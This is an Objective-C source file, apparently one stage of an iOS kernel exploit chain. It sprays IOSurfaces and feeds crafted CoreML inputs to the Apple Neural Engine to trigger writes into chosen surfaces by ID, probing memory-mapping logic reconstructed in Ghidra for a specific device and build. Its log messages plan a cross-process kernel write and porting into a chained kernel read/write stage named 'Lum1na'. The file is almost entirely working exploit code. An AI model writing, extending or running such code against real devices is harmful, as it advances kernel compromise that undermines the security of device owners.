//
//  P078AneYcraft3.m — 43748 y-craft on the 3-in model. See P078AneYcraft3.h.
//

#import "P078AneYcraft3.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <math.h>
#import <string.h>
#import <unistd.h>

#define P078_BUILD @"p078-ycraft3-v1"

#define P078_MODEL    @"XVRC27_3in_1out"
#define P078_N_SURF   412u          /* 400 candidate sids + capture + margin */
#define P078_CAP_MARK 0x53535353u
#define P078_ONES     0x3F800000u   /* fp32 1.0 */

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*p078_iosCreate_t)(CFDictionaryRef);
typedef uint32_t (*p078_iosGetID_t)(IOSurfaceRef);
typedef void *(*p078_iosBase_t)(IOSurfaceRef);
typedef size_t (*p078_iosAllocSz_t)(IOSurfaceRef);
typedef kern_return_t (*p078_iosLock_t)(IOSurfaceRef, uint32_t, uint32_t *);

typedef struct {
    IOSurfaceRef surf;
    uint32_t     sid;
    size_t       allocSize;
} p078_surf_t;

static int g_p078_fd = -1;
static NSMutableString *g_p078_buf;

static void p078_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([P078AneYcraft3 class]) {
        if (g_p078_buf) [g_p078_buf appendString:out];
        if (g_p078_fd >= 0) {
            const char *s = out.UTF8String;
            if (s) {
                write(g_p078_fd, s, strlen(s));
                fcntl(g_p078_fd, F_FULLFSYNC);   /* panic-surviving flush per line */
            }
        }
    }
}

#pragma mark - IOSurface helpers

static p078_iosCreate_t  s_iosCreate;
static p078_iosGetID_t   s_iosGetID;
static p078_iosBase_t    s_iosBase;
static p078_iosAllocSz_t s_iosAllocSz;
static p078_iosLock_t    s_iosLock;
static p078_iosLock_t    s_iosUnlock;

static BOOL p078_resolve_iosurface(void) {
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) return NO;
    s_iosCreate  = (p078_iosCreate_t)dlsym(h, "IOSurfaceCreate");
    s_iosGetID   = (p078_iosGetID_t)dlsym(h, "IOSurfaceGetID");
    s_iosBase    = (p078_iosBase_t)dlsym(h, "IOSurfaceGetBaseAddress");
    s_iosAllocSz = (p078_iosAllocSz_t)dlsym(h, "IOSurfaceGetAllocSize");
    s_iosLock    = (p078_iosLock_t)dlsym(h, "IOSurfaceLock");
    s_iosUnlock  = (p078_iosLock_t)dlsym(h, "IOSurfaceUnlock");
    return s_iosCreate && s_iosGetID && s_iosBase && s_iosAllocSz && s_iosLock && s_iosUnlock;
}

static CFNumberRef p078_cfnum(uint64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

static IOSurfaceRef p078_surface_create(void) {
    CFNumberRef w = p078_cfnum(1), h = p078_cfnum(1);
    CFNumberRef bpe = p078_cfnum(4), fmt = p078_cfnum(0x42475241); /* BGRA */
    const void *keys[] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                           CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vals[] = { w, h, bpe, fmt };
    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
                                               &kCFTypeDictionaryKeyCallBacks,
                                               &kCFTypeDictionaryValueCallBacks);
    CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(fmt);
    if (!props) return NULL;
    IOSurfaceRef s = s_iosCreate(props);
    CFRelease(props);
    return s;
}

static size_t p078_surface_fill_u32(IOSurfaceRef s, uint32_t pattern) {
    void *base = s_iosBase(s);
    size_t sz = s_iosAllocSz(s);
    if (!base || sz == 0 || sz > (16UL << 20)) return 0;
    if (s_iosLock(s, 0, NULL) != KERN_SUCCESS) return 0;
    uint32_t *p = (uint32_t *)base;
    for (size_t k = 0; k + 4 <= sz; k += 4) p[k / 4] = pattern;
    s_iosUnlock(s, 0, NULL);
    return sz;
}

static BOOL p078_surface_scan_pattern(p078_surf_t *e, const char *label, uint32_t pattern) {
    if (!e->surf) return NO;
    void *base = s_iosBase(e->surf);
    if (!base) return NO;
    size_t sz = e->allocSize;
    if (sz == 0 || sz > (16UL << 20)) return NO;
    if (s_iosLock(e->surf, 0, NULL) != KERN_SUCCESS) return NO;
    const uint8_t *b = (const uint8_t *)base;
    const uint8_t exp[4] = { (uint8_t)(pattern & 0xff), (uint8_t)((pattern >> 8) & 0xff),
                             (uint8_t)((pattern >> 16) & 0xff), (uint8_t)((pattern >> 24) & 0xff) };
    uint8_t first[16];
    memcpy(first, b, sizeof(first));
    size_t diffOff = sz;
    uint32_t diffCnt = 0;
    for (size_t k = 0; k < sz; k++) {
        if (b[k] != exp[k & 3]) { if (diffOff == sz) diffOff = k; diffCnt++; if (diffCnt >= 256) break; }
    }
    s_iosUnlock(e->surf, 0, NULL);
    if (diffOff != sz) {
        p078_log(@"  [!] %s TOUCHED sid=%u first diff at +0x%zx (>= %u bytes)",
                 label, e->sid, diffOff, diffCnt);
        p078_log(@"      first16 %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
                 first[0], first[1], first[2], first[3], first[4], first[5],
                 first[6], first[7], first[8], first[9], first[10], first[11],
                 first[12], first[13], first[14], first[15]);
        return YES;
    }
    return NO;
}

#pragma mark - fp16 decode + triple search

static double p078_fp16_decode(uint16_t bits) {
    uint32_t s = (bits >> 15) & 1u;
    uint32_t e = (bits >> 10) & 0x1Fu;
    uint32_t m = bits & 0x3FFu;
    double val;
    if (e == 0)      val = (double)m * 5.9604644775390625e-8;   /* m * 2^-24 */
    else if (e < 31) val = (1.0 + (double)m / 1024.0) * ldexp(1.0, (int)e - 15);
    else             val = (m == 0) ? INFINITY : NAN;
    return s ? -val : val;
}

/* search live sids for a multiset {a,b,c} (repeats allowed) with a+b+c==target.
   maxSid caps candidates (1023 keeps B-craft subnormal-encodable).
   Returns YES and fills a/b/c. */
static BOOL p078_find_triple(const uint32_t *sids, uint32_t n, uint32_t target,
                             uint32_t maxSid, uint32_t *aOut, uint32_t *bOut, uint32_t *cOut) {
    /* membership table over live sids <= maxSid */
    uint8_t *live = calloc(maxSid + 1, 1);
    for (uint32_t i = 0; i < n; i++)
        if (sids[i] >= 1 && sids[i] <= maxSid) live[sids[i]] = 1;
    /* k=3 same sid */
    if (target % 3 == 0 && target / 3 <= maxSid && live[target / 3]) {
        *aOut = *bOut = *cOut = target / 3; free(live); return YES;
    }
    /* 2a + b */
    for (uint32_t a = 1; a <= maxSid && 2 * a < target; a++) {
        if (!live[a]) continue;
        uint32_t b = target - 2 * a;
        if (b <= maxSid && live[b]) { *aOut = a; *bOut = a; *cOut = b; free(live); return YES; }
    }
    /* a + b + c distinct-ish */
    for (uint32_t a = 1; a <= maxSid; a++) {
        if (!live[a]) continue;
        for (uint32_t b = a; b <= maxSid; b++) {
            if (!live[b]) continue;
            uint32_t rest = target - a - b;
            if (rest < b || rest > maxSid) continue;
            if (live[rest]) { *aOut = a; *bOut = b; *cOut = rest; free(live); return YES; }
        }
    }
    free(live);
    return NO;
}

#pragma mark - CoreML

static NSURL *p078_model_url(NSString *name) {
    NSBundle *b = [NSBundle mainBundle];
    NSURL *u = [b URLForResource:name withExtension:@"mlmodelc"];
    if (u) return u;
    return [b URLForResource:name withExtension:@"mlpackage"];
}

static MLModel *p078_load(NSURL *url, MLComputeUnits units, NSError **errOut) {
    MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
    cfg.computeUnits = units;
    return [MLModel modelWithContentsOfURL:url configuration:cfg error:errOut];
}

static MLDictionaryFeatureProvider *p078_provider3(double x0, double x1, double x2,
                                                   NSError **errOut) {
    double xs[3] = { x0, x1, x2 };
    NSMutableDictionary *features = [NSMutableDictionary dictionary];
    for (uint32_t i = 0; i < 3; i++) {
        MLMultiArray *m = [[MLMultiArray alloc] initWithShape:@[ @1 ]
                                                     dataType:MLMultiArrayDataTypeDouble
                                                        error:nil];
        if (!m) return nil;
        m[0] = @( xs[i] );
        features[[NSString stringWithFormat:@"x_%03u", i]] =
            [MLFeatureValue featureValueWithMultiArray:m];
    }
    return [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:errOut];
}

static double p078_predict(MLModel *model, MLDictionaryFeatureProvider *fp,
                           NSTimeInterval *dur, NSError **errOut) {
    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    id<MLFeatureProvider> pred = [model predictionFromFeatures:fp error:errOut];
    CFAbsoluteTime t1 = CFAbsoluteTimeGetCurrent();
    *dur = t1 - t0;
    if (!pred) return NAN;
    MLFeatureValue *yv = [pred featureValueForName:@"y"];
    MLMultiArray *ya = yv.multiArrayValue;
    return ya ? ya[0].doubleValue : NAN;
}

static NSString *p078_yfmt(double y) {
    return (y == y) ? [NSString stringWithFormat:@"%.6e", y] : @"NaN";
}

@implementation P078AneYcraft3

+ (NSString *)tap {
    g_p078_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p078_ane_ycraft3_log.txt"];
    g_p078_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p078_log(@"=== p078 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P078_BUILD);
    p078_log(@"43748 y-craft on XVRC27_3in_1out. Ghidra (MemoryMapRequest_gated,");
    p078_log(@"bee5f818): entry sid = field[0]; FIRST BAD RECORD ABORTS the request;");
    p078_log(@"P077 died at its INPUT records — output record never reached. Here ALL");
    p078_log(@"input records are valid live sids (a+b+c == sid_C), so the loop reaches");
    p078_log(@"the OUTPUT record whose sid is hypothesized = previous predict's y.");
    p078_log(@"Capture scan = write door; y==0.0/3.0 = ANE ran on OUR wired surfaces.");
    p078_log(@"%@", [P007Board shared].kreadSignal);

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p078"];
    if (stop) {
        p078_log(@"%@", stop);
        if (g_p078_fd >= 0) { fcntl(g_p078_fd, F_FULLFSYNC); close(g_p078_fd); g_p078_fd = -1; }
        NSString *ret = g_p078_buf; g_p078_buf = nil; return ret;
    }
    p078_log(@"%@", [LabDeviceProfile identBlock]);

    if (!p078_resolve_iosurface()) {
        p078_log(@"[-] IOSurface dlsym FAILED — abort");
        p078_log(@"=== VERDICT ===");
        p078_log(@"abort (iosurface). hasKread=NO hasKwrite=NO.");
        if (g_p078_fd >= 0) { fcntl(g_p078_fd, F_FULLFSYNC); close(g_p078_fd); g_p078_fd = -1; }
        NSString *ret = g_p078_buf; g_p078_buf = nil; return ret;
    }

    /* ---- surfaces ---- */
    p078_surf_t *surfs = calloc(P078_N_SURF, sizeof(p078_surf_t));
    uint32_t made = 0;
    for (uint32_t i = 0; i < P078_N_SURF; i++) {
        IOSurfaceRef s = p078_surface_create();
        if (!s) continue;
        surfs[made].surf = s;
        surfs[made].sid = s_iosGetID(s);
        surfs[made].allocSize = s_iosAllocSz(s);
        made++;
    }
    p078_log(@"[+] surfaces: %u/%u", made, P078_N_SURF);
    if (made < 8) {
        p078_log(@"[-] too few surfaces — abort");
        p078_log(@"=== VERDICT ===");
        p078_log(@"abort (surfaces). hasKread=NO hasKwrite=NO.");
        if (g_p078_fd >= 0) { fcntl(g_p078_fd, F_FULLFSYNC); close(g_p078_fd); g_p078_fd = -1; }
        NSString *ret = g_p078_buf; g_p078_buf = nil; return ret;
    }
    p078_surf_t *cap = &surfs[made - 1];      /* capture = last */
    uint32_t sidC = cap->sid;
    uint32_t nCand = made - 1;                /* candidate sids exclude capture */

    for (uint32_t i = 0; i < made; i++) {
        if (&surfs[i] != cap) p078_surface_fill_u32(surfs[i].surf, P078_ONES);
    }
    p078_surface_fill_u32(cap->surf, P078_CAP_MARK);
    p078_log(@"[+] capture sid_C=%u marker 0x53; candidates %u sids in [%u..%u]",
             sidC, nCand, surfs[0].sid, surfs[nCand - 1].sid);

    /* ---- triples ---- */
    uint32_t a1 = 0, b1 = 0, c1 = 0, a2 = 0, b2 = 0, c2 = 0;
    BOOL aOK = p078_find_triple(&surfs[0].sid, nCand, sidC, 2047, &a1, &b1, &c1);
    BOOL bOK = p078_find_triple(&surfs[0].sid, nCand, sidC, 1023, &a2, &b2, &c2);
    p078_log(@"[+] craft-A triple (<=2047): %s  {%u %u %u} sum=%u (target %u)",
             aOK ? "FOUND" : "none", a1, b1, c1, a1 + b1 + c1, sidC);
    p078_log(@"[+] craft-B triple (<=1023 subnormal-encodable): %s  {%u %u %u} sum=%u",
             bOK ? "FOUND" : "none", a2, b2, c2, a2 + b2 + c2);
    if (!aOK && !bOK) {
        p078_log(@"[-] no triple either world — abort (need denser sid space; fresh boot)");
        p078_log(@"=== VERDICT ===");
        p078_log(@"abort (no triple). hasKread=NO hasKwrite=NO.");
        for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p078_fd >= 0) { fcntl(g_p078_fd, F_FULLFSYNC); close(g_p078_fd); g_p078_fd = -1; }
        NSString *ret = g_p078_buf; g_p078_buf = nil; return ret;
    }

    /* ---- load model (All) ---- */
    NSError *err = nil;
    MLModel *model = p078_load(p078_model_url(P078_MODEL), MLComputeUnitsAll, &err);
    if (!model) {
        p078_log(@"[-] load FAILED: %@", err.localizedDescription ?: @"-");
        p078_log(@"=== VERDICT ===");
        p078_log(@"abort (load). hasKread=NO hasKwrite=NO.");
        for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p078_fd >= 0) { fcntl(g_p078_fd, F_FULLFSYNC); close(g_p078_fd); g_p078_fd = -1; }
        NSString *ret = g_p078_buf; g_p078_buf = nil; return ret;
    }
    p078_log(@"[+] %@ loaded (All)", P078_MODEL);

    /* ---- warm: three arbitrary live sids ---- */
    double wvB = p078_fp16_decode((uint16_t)(sidC & 0xFFFFu));
    NSTimeInterval d = 0;
    MLDictionaryFeatureProvider *fpW = p078_provider3((double)surfs[0].sid,
                                                      (double)surfs[1].sid,
                                                      (double)surfs[2].sid, &err);
    double yW = p078_predict(model, fpW, &d, &err);
    BOOL capW = p078_surface_scan_pattern(cap, "capture(W)", P078_CAP_MARK);
    p078_log(@"[*] W   y=%@ t=%.1fms cap=%d (staging-sum baseline, sum=%u)",
             p078_yfmt(yW), d * 1000.0, capW, surfs[0].sid + surfs[1].sid + surfs[2].sid);

    /* ---- CRAFT-A (value-decode world): x = (a,b,c), y target == sid_C ---- */
    BOOL capA1 = NO, capA2 = NO, capA3 = NO;
    double yA1 = NAN, yA2 = NAN, yA3 = NAN;
    if (aOK) {
        p078_log(@">>> CRAFT-A: x=(%u,%u,%u) -> y target sid_C=%u exactly; next predict's",
                 a1, b1, c1, sidC);
        p078_log(@"    output entry sid hypothesized = fp16_value(staged y) = %u", sidC);
        MLDictionaryFeatureProvider *fpA = p078_provider3((double)a1, (double)b1, (double)c1, &err);
        yA1 = p078_predict(model, fpA, &d, &err);
        capA1 = p078_surface_scan_pattern(cap, "capture(A1)", P078_CAP_MARK);
        p078_log(@"[*] A1  y=%@ t=%.1fms cap=%d (417-shape = fallback; 0.0/3.0 = ANE ran)",
                 p078_yfmt(yA1), d * 1000.0, capA1);

        yA2 = p078_predict(model, fpA, &d, &err);
        capA2 = p078_surface_scan_pattern(cap, "capture(A2)", P078_CAP_MARK);
        p078_log(@"[*] A2  y=%@ t=%.1fms cap=%d <- WRITE-DOOR SCAN (staged value = sid_C)",
                 p078_yfmt(yA2), d * 1000.0, capA2);

        yA3 = p078_predict(model, fpA, &d, &err);
        capA3 = p078_surface_scan_pattern(cap, "capture(A3)", P078_CAP_MARK);
        p078_log(@"[*] A3  y=%@ t=%.1fms cap=%d (stability)", p078_yfmt(yA3), d * 1000.0, capA3);
    } else {
        p078_log(@"[-] craft-A SKIPPED (no triple <= 2047)");
    }

    /* ---- CRAFT-B (raw-bits world): x = subnormals with bits a,b,c ---- */
    BOOL capB1 = NO, capB2 = NO, capB3 = NO;
    double yB1 = NAN, yB2 = NAN, yB3 = NAN;
    if (bOK) {
        double x0 = p078_fp16_decode((uint16_t)a2);
        double x1 = p078_fp16_decode((uint16_t)b2);
        double x2 = p078_fp16_decode((uint16_t)c2);
        p078_log(@">>> CRAFT-B: x=(fp16 0x%04x,0x%04x,0x%04x) values %.9e %.9e %.9e",
                 (uint16_t)a2, (uint16_t)b2, (uint16_t)c2, x0, x1, x2);
        p078_log(@"    sum = %u * 2^-24 (exact subnormal chain); y bits target 0x%04x = sid_C",
                 a2 + b2 + c2, (uint16_t)(sidC & 0xFFFFu));
        MLDictionaryFeatureProvider *fpB = p078_provider3(x0, x1, x2, &err);
        yB1 = p078_predict(model, fpB, &d, &err);
        capB1 = p078_surface_scan_pattern(cap, "capture(B1)", P078_CAP_MARK);
        p078_log(@"[*] B1  y=%@ t=%.1fms cap=%d (expect %.9e exact)",
                 p078_yfmt(yB1), d * 1000.0, capB1, (double)(a2 + b2 + c2) * 5.9604644775390625e-8);

        yB2 = p078_predict(model, fpB, &d, &err);
        capB2 = p078_surface_scan_pattern(cap, "capture(B2)", P078_CAP_MARK);
        p078_log(@"[*] B2  y=%@ t=%.1fms cap=%d <- WRITE-DOOR SCAN (staged bits = sid_C)",
                 p078_yfmt(yB2), d * 1000.0, capB2);

        yB3 = p078_predict(model, fpB, &d, &err);
        capB3 = p078_surface_scan_pattern(cap, "capture(B3)", P078_CAP_MARK);
        p078_log(@"[*] B3  y=%@ t=%.1fms cap=%d (stability)", p078_yfmt(yB3), d * 1000.0, capB3);
    } else {
        p078_log(@"[-] craft-B SKIPPED (no triple <= 1023)");
    }

    /* input read-only check */
    BOOL inTouched = p078_surface_scan_pattern(&surfs[0], "cand[0](end)", P078_ONES);
    p078_log(@"[*] cand[0] touched=%d (expected NO — inputs read-only)", inTouched);

    /* ---- verdict ---- */
    p078_log(@"=== VERDICT ===");
    BOOL writeDoor = (capA2 || capA3 || capB2 || capB3);
    BOOL aneRan = ((aOK && (yA2 == 0.0 || yA2 == 3.0)) ||
                   (bOK && (yB2 == 0.0 || yB2 == 3.0)));

    if (writeDoor) {
        p078_log(@"WRITE DOOR OPEN: capture (sid_C=%u) WRITTEN through the crafted output", sidC);
        p078_log(@"record — output entry sid = staged y = sid_C, fetch+wire succeeded,");
        p078_log(@"compute fired. Own-target this tap. NEXT Stage B: craft a FOREIGN sid");
        p078_log(@"(enumerated cross-process sid) as the y value = cross-process kernel");
        p078_log(@"write. Then port into Lum1na as the chained 43748 KRW stage.");
        [[P007Board shared] recordEvent:@"p078_session" kind:@"write_door"
                                 detail:[NSString stringWithFormat:@"sid_C=%u", sidC]
                                 source:@"p078"];
    }
    if (aneRan) {
        p078_log(@"ANE RAN on OUR wired surfaces (y==0.0/3.0 with all-valid records):");
        p078_log(@"buffer-cache HIT with sid-from-staged-content = CONFIRMED at submit.");
        if (!writeDoor) {
            p078_log(@"But capture untouched -> output entry sid != staged content.");
            p078_log(@"Read door via wired inputs is LIVE though: arm ONE foreign sid as x");
            p078_log(@"(staged content = foreign sid -> wired as INPUT) = y leaks foreign bytes.");
        }
        [[P007Board shared] recordEvent:@"p078_session" kind:@"read_door"
                                 detail:@"y==0/3 on valid-input craft" source:@"p078"];
    }
    if (!writeDoor && !aneRan) {
        p078_log(@"No door. y shapes: W=%@ A1=%@ A2=%@ B1=%@ B2=%@",
                 p078_yfmt(yW), p078_yfmt(yA1), p078_yfmt(yA2),
                 p078_yfmt(yB1), p078_yfmt(yB2));
        p078_log(@"All-valid-input crafts with y==sid_C/vB shape = request aborted before");
        p078_log(@"compute — either the output entry sid is NOT the staged y (client fill");
        p078_log(@"source unknown), or the submit path aborts on its own dict sids.");
        p078_log(@"NEXT: hunt the CLIENT fill (espresso/CoreML side) — who writes the");
        p078_log(@"MemoryMapRequest entry field[0] — and the submit dict sid source.");
        [[P007Board shared] recordEvent:@"p078_session" kind:@"miss"
                                 detail:@"no door" source:@"p078"];
    }
    p078_log(@"Honesty: own surfaces only this tap; foreign transfer not measured.");
    p078_log(@"Conversion bar (desc_type_forged OR (body_forged AND kptr)) untouched.");
    p078_log(@"hasKread=NO hasKwrite=NO. One TAP per force-quit; fresh boot next tap.");

    for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
    free(surfs);

    if (g_p078_fd >= 0) { fcntl(g_p078_fd, F_FULLFSYNC); close(g_p078_fd); g_p078_fd = -1; }
    NSString *ret = g_p078_buf;
    g_p078_buf = nil;
    return ret;
}

@end